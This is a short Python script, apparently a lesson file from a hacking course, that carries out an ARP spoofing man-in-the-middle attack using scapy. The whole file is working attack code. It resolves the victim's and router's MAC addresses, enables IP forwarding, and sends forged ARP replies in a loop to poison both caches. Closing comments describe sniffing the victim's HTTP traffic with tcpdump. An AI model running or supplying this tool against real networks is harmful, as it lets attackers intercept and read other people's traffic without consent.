"""
arpspoofer @Mamkin Hacker
run: sudo python3 ./l11-arpspoof.py -v "192.168.1.242" -r "192.168.1.1"
"""
import scapy.all as scapy
import argparse
from scapy.layers.l2 import Ether, ARP
import time
import subprocess


def args():
    parser = argparse.ArgumentParser(__doc__)
    parser.add_argument("-v", "--victim", required=True)
    parser.add_argument("-r", "--router", required=True)
    return parser.parse_args()


def get_mac(ip):
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    p = ether / arp
    ans, _ = scapy.srp(p, timeout=4, verbose=False)  # ans =[(s,r)]
    try:
        return ans[0][1].hwsrc
    except:
        return False


def spoof(victim, router):
    victim_mac = get_mac(victim)
    router_mac = get_mac(router)
    if not victim_mac:
        print(f"can't find mac for ip {victim}, exit...")
        exit(0)
    if not router_mac:
        print(f"can't find mac for ip {router}, exit...")
        exit(0)

    packet_to_victim = ARP(
        pdst=victim, op=2, hwdst=victim_mac, psrc=router)  # mac = of attaker
    packet_to_router = ARP(pdst=router, op=2, hwdst=router_mac, psrc=victim)
    counter = 0
    while True:
        counter += 2
        print(f"\r{'*' * (counter % 120)}", end="")
        scapy.send(packet_to_router, verbose=False)
        scapy.send(packet_to_victim, verbose=False)
        time.sleep(5)


if __name__ == '__main__':
    options = args()
    # Enabling ip_forward
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    ipfwd_state = subprocess.run(
        ["cat", "/proc/sys/net/ipv4/ip_forward"], stdout=subprocess.PIPE)
    print(f"ip_forwarding= {ipfwd_state.stdout.decode()}")
    # Start spoofing
    spoof(options.victim, options.router)
    # Run 'sudo tcpdump -vv -i any port 80' on this host
    # Now open browser on victim host, open http site
    # And your see spoofed packets
